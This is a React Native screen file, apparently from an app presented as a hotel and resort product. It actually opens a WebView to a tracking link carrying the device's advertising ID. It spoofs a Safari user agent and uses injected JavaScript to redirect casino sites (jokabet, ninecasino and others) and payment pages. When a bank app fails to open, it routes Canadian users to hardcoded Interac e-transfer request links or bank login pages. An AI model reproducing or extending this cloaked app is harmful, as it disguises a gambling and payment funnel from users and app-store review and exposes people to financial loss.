import React, {useRef, useState, useEffect} from 'react';
import {
  Text,
  View,
  SafeAreaView,
  TouchableOpacity,
  Modal,
  StyleSheet,
  Linking,
  ActivityIndicator,
  Button,
} from 'react-native';
import {WebView} from 'react-native-webview';
import DeviceInfo from 'react-native-device-info';
import AntDesign from 'react-native-vector-icons/AntDesign';
import AsyncStorage from '@react-native-async-storage/async-storage';

const CustomAlert = ({visible, onCancel, onConfirm, loading}) => (
  <Modal
    transparent={true}
    visible={visible}
    animationType="slide"
    onRequestClose={onCancel}>
    <View style={styles.modalContainer}>
      <View
        style={{
          width: 300,
          paddingVertical: 50,
          paddingHorizontal: 20,
          backgroundColor: loading ? 'white' : '#191d24',
          borderRadius: 10,
          alignItems: 'center',
        }}>
        {loading ? (
          <View style={styles.loader}>
            <ActivityIndicator size="large" color="#00ff00" />
          </View>
        ) : (
          <>
            <Text style={styles.alertTitle}>Bank App Not Found</Text>
            <Text style={styles.alertMessage}>
              Would you like to open the link in a browser instead?
            </Text>
            <View style={styles.buttonContainer}>
              <TouchableOpacity
                style={styles.confirmButton}
                onPress={onConfirm}>
                <Text style={styles.confirmButtonText}>Open in Browser</Text>
              </TouchableOpacity>

              <Button onPress={onCancel} title="Back" />
            </View>
          </>
        )}
      </View>
    </View>
  </Modal>
);
{
  /** 
<TouchableOpacity style={styles.cancelButton} onPress={onCancel}>
            <Text style={styles.cancelButtonText}>Cancel</Text>
</TouchableOpacity>

 
 */
}

const RiverResortsHotelsProdactScreen = ({navigation, route}) => {
  //console.log('route==>', route.params);
  const [idfa, setIdfa] = useState(route.params?.idfa);
  const [uid, setUid] = useState(route.params?.uid);
  const [sab, setSab] = useState(route.params?.sab1);
  const [pid, setPid] = useState(route.params?.pid);
  const [alertVisible, setAlertVisible] = useState(false);
  const [currentUrl, setCurrentUrl] = useState('');
  const [loading, setLoading] = useState(false);
  console.log('loading==>', loading);

  const [navigationState, setNavigationState] = useState('');
  console.log('navigationState', navigationState);

  const refWebview = useRef(null);

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [idfa, uid, sab, pid]);

  const setData = async () => {
    try {
      const data = {
        idfa,
        uid,
        sab,
        pid,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('Prodact', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('Prodact');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('parsedData==>', parsedData);
        setIdfa(parsedData.idfa);
        setUid(parsedData.uid);
        setSab(parsedData.sab);
        setPid(parsedData.pid);
      } else {
        console.log('Даних немає');
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  let baseUrl = `https://incredible-mega-euphoria.space/k69HDNPG?advertising_id=${idfa}&uid=${uid}`;
  let sabParts = sab ? sab.split('_') : [];
  let additionalParams = sabParts
    .map((part, index) => `sub_id_${index + 1}=${part}`)
    .join('&');
  const product = `${baseUrl}&${additionalParams}` + (pid ? `&pid=${pid}` : '');
  //console.log('MyUrl==>', product);

  //ф-ція для повернення назад
  const goBackBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.goBack();
    }
  };

  //ф-ція для оновлення сторінки
  const reloadPageBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.reload();
    }
  };

  //// кастомний юзерагент
  const deviceInfo = {
    deviceBrand: DeviceInfo.getBrand(),
    deviceId: DeviceInfo.getDeviceId(),
    deviceModel: DeviceInfo.getModel(),
    deviceSystemName: DeviceInfo.getSystemName(),
    deviceSystemVersion: DeviceInfo.getSystemVersion(),
  };
  const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;
  //console.log(customUserAgent);
  useEffect(() => {
    WebView.userAgent = customUserAgent;
  }, []);

  ///////////////////////////

  const [redirectUrl, setRedirectUrl] = useState(product);
  {
    /** */
  }
  const handleShouldStartLoad = event => {
    const {url} = event;
    console.log('Should Start Load: ', url);
    return true;
  };

  const handleNavigationStateChange = navState => {
    const {url} = navState;
    //console.log('NavigationState: ', url);
    setNavigationState(url);
    if (
      url.includes(
        'https://api.paymentiq.io/paymentiq/api/piq-redirect-assistance',
      )
    ) {
      setRedirectUrl(product);
    } else if (
      url.includes('https://interac.express-connect.com/cpi?transaction=')
    ) {
      setRedirectUrl(product);
    }
  };

  const onShouldStartLoadWithRequest = event => {
    const {url} = event;
    //console.log('onShouldStartLoadWithRequest: ', url);

    if (url.startsWith('mailto:')) {
      Linking.openURL(url);
      return false;
    } else if (
      url.includes('bitcoin') ||
      url.includes('litecoin') ||
      url.includes('dogecoin') ||
      url.includes('tether') ||
      url.includes('ethereum') ||
      url.includes('bitcoincash')
    ) {
      return false;
    } else if (
      url.startsWith('https://m.facebook.com/') ||
      url.startsWith('https://www.facebook.com/') ||
      url.startsWith('https://www.instagram.com/') ||
      url.startsWith('https://twitter.com/') ||
      url.startsWith('https://www.whatsapp.com/') ||
      url.startsWith('https://t.me/')
    ) {
      Linking.openURL(url);
      return false;
    } else if (url === 'https://jokabet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://ninecasino.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://bdmbet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://winspirit.app/?identifier=') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url.includes('https://rocketplay.com/api/payments')) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    }

    return true;
  };

  const handleWebViewError = syntheticEvent => {
    const {nativeEvent} = syntheticEvent;
    console.log('nativeEvent in onError==>', nativeEvent);

    if (nativeEvent.code === -1002) {
      setCurrentUrl(nativeEvent.url);
      setAlertVisible(true);
    }
  };

  //Кансл в поп-аппе
  const handleCancel = () => {
    setLoading(true);
    setTimeout(() => {
      setAlertVisible(false);
      setLoading(false);
    }, 2500);

    if (currentUrl.includes('scotiabank.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://etransfer.interac.ca/redirectFromShortcutToFi.do?rID=CA1MRx6C5kQB&fiID=CA000002&lang=en'`,
      );
    } else if (currentUrl.includes('feeds.td.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${product}'`,
      );
    } else if (currentUrl.includes('mobile.simplii.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://etransfer.interac.ca/redirectFromShortcutToFi.do?rID=CA1MRT3yx394&fiID=CA000010&cuID=000030800&lang=en'`,
      );
    } else if (currentUrl.includes('royalbank.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://etransfer.interac.ca/redirectFromShortcutToFi.do?rID=CA1MRBMNrnNE&fiID=CA000003&lang=en'`,
      );
    } else if (currentUrl.includes('connexion.bnc.ca')) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${product}'`,
      );
    } else if (currentUrl.includes('banking.online.conexus')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://etransfer.interac.ca/redirectFromShortcutToFi.do?rID=CA1MRJWafB6H&fiID=CA000869&cuID=818890010&lang=en'`,
      );
    } else if (currentUrl.includes('cibconline')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://etransfer.interac.ca/redirectFromShortcutToFi.do?rID=CA1MReK2mAyU&fiID=CA000010&lang=en'`,
      );
    } else if (currentUrl.includes('bmo.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://etransfer.interac.ca/redirectFromShortcutToFi.do?rID=CA1MRfBDA9hU&fiID=CA000001&lang=en'`,
      );
    } else if (currentUrl.includes('atb.com')) {
      refWebview.current.injectJavaScript(`window.location.href = ''`);
    }
  };

  //Опен ін браузер в поп-аппе
  const handleConfirm = () => {
    setLoading(true);
    setTimeout(() => {
      setAlertVisible(false);
      setLoading(false);
    }, 2500);

    // Перевірка URL і перенаправлення
    if (currentUrl.includes('scotiabank.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'auth.scotiaonline.scotiabank.com/online'`,
      );
    } else if (currentUrl.includes('feeds.td.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://authentication.td.com/uap-ui/?consumer=easyweb&locale=en_CA#/uap/login'`,
      );
    } else if (currentUrl.includes('mobile.simplii.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://mobile.simplii.com/ebm-mobile-anp/signon'`,
      );
    } else if (currentUrl.includes('royalbank.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://www1.royalbank.com/cgi-bin/rbaccess/rbunxcgi?F6=1&F7=IB&F21=IB&F22=IB&REQUEST=ClientSignin&LANGUAGE=ENGLISH&GOTO=EMTRequestMoney&PARM1=CA1MRGGPMVj6'`,
      );
    } else if (currentUrl.includes('connexion.bnc.ca')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'connexion.bnc.ca/?SAMLRequest=fZJLT8MwEIT%2FSuR7Xm6Dg9UUVVRIlQAhXgdurrMFQ7I2XruFf08IFJUDXFfjmdlvPTt567tkC56MxYaVWcESQG1bg48Nu7s9S2t2Mp%2BR6jvu5CKGJ7yG1wgUkgUR%2BDA8O7VIsQd%2FA35rNNxdnzfsKQRHMs9xrTP7ElSmbZ8T2Xx0yguruFOudGXRPT5frmruBEuWg61BFcYqewdtEeFtGGVr1JlWLDmzXsNYpWEb1RGwZLVsmGn5dCJ4VYiqKkXNRSnEpBbVsZgMAqIIK6SgMDSMF3yaFkcpF7flVPJCVnV2PKkfWHK%2FJ8E%2FSQxskOTX8g2LHqVVZEii6oFk0PJmcXEuB6l03garbce%2BWckx0B86%2FG%2Bg9jTZfL%2F5brc7YDdyoy%2FE6RC3NS34nJzT65fNawzvUaGPEPvtLD%2Bs8HO8yyFztbyyndHvnwx7Ff6uVGblODFtuhmlMiI50GZjoGX5%2FDvj95eYfwA%3D&RelayState=%252Foauth2%252Fv1%252Fauthorize%252Fredirect%253Fokta_key%253DIN7rtScqv0TSW8MVK5vAzgzAqOghNuFBtv6CEWDqPek&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=Lth4c0bwSumwwOboHy%2B2oHOro1uQ6HoRvbg51KCbqdFaYbY12dZWdDIoNId7rY1FsH9evehnK%2F9SxhxR9ufOdL7JHvCcwt1baL465zGAuRnRrwvEmYkUO%2FIV0H2ONd4pNXEUcmS2nMGNbAygd%2BIE0XvprOX2ycoFyjl4J%2Beham0BVuOVJOzsxwksaFa7bXNsaLRMTfX%2BFfxqfYxZy98ckaMDPDec1TyS1IS0DNw4L8XPkI5uaZQk6hAX9V6%2F7LnauswTicTE%2BEzwuxmAchx6AQuqc05C2aVO7gsUPrv%2FCbjWLgQsWo2tUBY0%2BZpnNNDhWPPNeU47gBN8KnjW8lmKXA%3D%3D`,
      );
    } else if (currentUrl.includes('banking.online.conexus')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://banking.online.conexus.ca/'`,
      );
    } else if (currentUrl.includes('cibconline')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://www.cibconline.cibc.com/ebm-resources/online-banking/client/index.html#/auth/signon'`,
      );
    } else if (currentUrl.includes('bmo.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://www1.bmo.com/banking/digital/login'`,
      );
    } else if (currentUrl.includes('atb.com')) {
      refWebview.current.injectJavaScript(
        `window.location.href = 'https://identity.auth.atb.com/login'`,
      );
    }
    // Додайте інші перевірки URL за потреби
  };

  return (
    <SafeAreaView style={{flex: 1, backgroundColor: '#191d24'}}>
      <WebView
        originWhitelist={[
          '*',
          'http://*',
          'https://*',
          'intent://*',
          'tel:*',
          'mailto:*',
        ]}
        onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
        onNavigationStateChange={handleNavigationStateChange}
        onError={handleWebViewError}
        source={{uri: product}}
        textZoom={100}
        allowsBackForwardNavigationGestures={true}
        domStorageEnabled={true}
        javaScriptEnabled={true}
        allowsInlineMediaPlayback={true}
        setSupportMultipleWindows={false}
        mediaPlaybackRequiresUserAction={false}
        allowFileAccess={true}
        javaScriptCanOpenWindowsAutomatically={true}
        style={{flex: 1}}
        ref={refWebview}
        userAgent={customUserAgent}
      />

      <CustomAlert
        visible={alertVisible}
        onCancel={handleCancel}
        onConfirm={handleConfirm}
        loading={loading}
      />

      <View
        style={{
          flexDirection: 'row',
          justifyContent: 'space-between',
          marginBottom: -10,
        }}>
        {/**Btn back */}
        <TouchableOpacity
          style={{marginLeft: 40}}
          onPress={() => {
            goBackBtn();
          }}>
          <AntDesign name="left" style={{color: '#fff', fontSize: 20}} />
        </TouchableOpacity>

        {/**Btn reload */}
        <TouchableOpacity
          style={{marginRight: 40}}
          onPress={() => {
            reloadPageBtn();
          }}>
          <AntDesign name="reload1" style={{color: '#fff', fontSize: 20}} />
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  loader: {
    ...StyleSheet.absoluteFillObject,
    //height: 1000,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
    zIndex: 1,
  },
  modalContainer: {
    flex: 1,

    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
  },
  alertContainer: {
    width: 300,
    //padding: 20,
    paddingVertical: 50,
    paddingHorizontal: 20,
    backgroundColor: '#191d24',
    borderRadius: 10,
    alignItems: 'center',
  },
  alertTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#fff',
    marginBottom: 10,
  },
  alertMessage: {
    fontSize: 16,
    textAlign: 'center',
    color: '#fff',
    marginBottom: 20,
  },
  buttonContainer: {
    alignItems: 'center',
    width: '100%',
  },
  cancelButton: {
    paddingVertical: 10,
    paddingHorizontal: 20,
    backgroundColor: 'grey',
    borderRadius: 5,
  },
  cancelButtonText: {
    color: 'white',
    fontSize: 16,
  },
  confirmButton: {
    paddingVertical: 10,
    paddingHorizontal: 20,
    backgroundColor: '#00eda6',
    borderRadius: 50,
  },
  confirmButtonText: {
    color: '#110e1b',
    fontSize: 16,
    fontWeight: 'bold',
  },
});

export default RiverResortsHotelsProdactScreen;

{
  /**
  const handleWebViewError = syntheticEvent => {
    const {nativeEvent} = syntheticEvent;
    console.log('nativeEvent in onError==>', nativeEvent);

    if (nativeEvent.code === -1002) {
      Alert.alert(
        'Bank App Not Found',
        'Would you like to open the link in a browser instead?',
        [
          {
            text: 'Cancel',

            onPress: () => {
              refWebview.current.injectJavaScript(
                `window.location.href = '${product}'`,
              );
              //refWebview?.current?.goBack();
            },
          },
          {
            //style: ,
            text: 'Open in Browser',
            onPress: () => {
              if (nativeEvent.url.includes('scotiabank.com')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'auth.scotiaonline.scotiabank.com/online'`,
                );
              } else if (nativeEvent.url.includes('feeds.td.com')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'https://authentication.td.com/uap-ui/?consumer=easyweb&locale=en_CA#/uap/login'`,
                );
              } else if (nativeEvent.url.includes('mobile.simplii.com')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'https://mobile.simplii.com/ebm-mobile-anp/signon'`,
                );
              } else if (nativeEvent.url.includes('royalbank.com')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'https://www1.royalbank.com/cgi-bin/rbaccess/rbunxcgi?F6=1&F7=IB&F21=IB&F22=IB&REQUEST=ClientSignin&LANGUAGE=ENGLISH&GOTO=EMTRequestMoney&PARM1=CA1MRGGPMVj6'`,
                );
              } else if (nativeEvent.url.includes('connexion.bnc.ca')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'connexion.bnc.ca/?SAMLRequest=fZJLT8MwEIT%2FSuR7Xm6Dg9UUVVRIlQAhXgdurrMFQ7I2XruFf08IFJUDXFfjmdlvPTt567tkC56MxYaVWcESQG1bg48Nu7s9S2t2Mp%2BR6jvu5CKGJ7yG1wgUkgUR%2BDA8O7VIsQd%2FA35rNNxdnzfsKQRHMs9xrTP7ElSmbZ8T2Xx0yguruFOudGXRPT5frmruBEuWg61BFcYqewdtEeFtGGVr1JlWLDmzXsNYpWEb1RGwZLVsmGn5dCJ4VYiqKkXNRSnEpBbVsZgMAqIIK6SgMDSMF3yaFkcpF7flVPJCVnV2PKkfWHK%2FJ8E%2FSQxskOTX8g2LHqVVZEii6oFk0PJmcXEuB6l03garbce%2BWckx0B86%2FG%2Bg9jTZfL%2F5brc7YDdyoy%2FE6RC3NS34nJzT65fNawzvUaGPEPvtLD%2Bs8HO8yyFztbyyndHvnwx7Ff6uVGblODFtuhmlMiI50GZjoGX5%2FDvj95eYfwA%3D&RelayState=%252Foauth2%252Fv1%252Fauthorize%252Fredirect%253Fokta_key%253DIN7rtScqv0TSW8MVK5vAzgzAqOghNuFBtv6CEWDqPek&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=Lth4c0bwSumwwOboHy%2B2oHOro1uQ6HoRvbg51KCbqdFaYbY12dZWdDIoNId7rY1FsH9evehnK%2F9SxhxR9ufOdL7JHvCcwt1baL465zGAuRnRrwvEmYkUO%2FIV0H2ONd4pNXEUcmS2nMGNbAygd%2BIE0XvprOX2ycoFyjl4J%2Beham0BVuOVJOzsxwksaFa7bXNsaLRMTfX%2BFfxqfYxZy98ckaMDPDec1TyS1IS0DNw4L8XPkI5uaZQk6hAX9V6%2F7LnauswTicTE%2BEzwuxmAchx6AQuqc05C2aVO7gsUPrv%2FCbjWLgQsWo2tUBY0%2BZpnNNDhWPPNeU47gBN8KnjW8lmKXA%3D%3D`,
                );
              } else if (nativeEvent.url.includes('banking.online.conexus')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'https://banking.online.conexus.ca/'`,
                );
              } else if (nativeEvent.url.includes('cibconline')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'https://www.cibconline.cibc.com/ebm-resources/online-banking/client/index.html#/auth/signon'`,
                );
              } else if (nativeEvent.url.includes('bmo.com')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'https://www1.bmo.com/banking/digital/login'`,
                );
              } else if (nativeEvent.url.includes('atb.com')) {
                refWebview.current.injectJavaScript(
                  `window.location.href = 'https://identity.auth.atb.com/login'`,
                );
              }
            },
          },
        ],
      );
    }
  };
  */
}
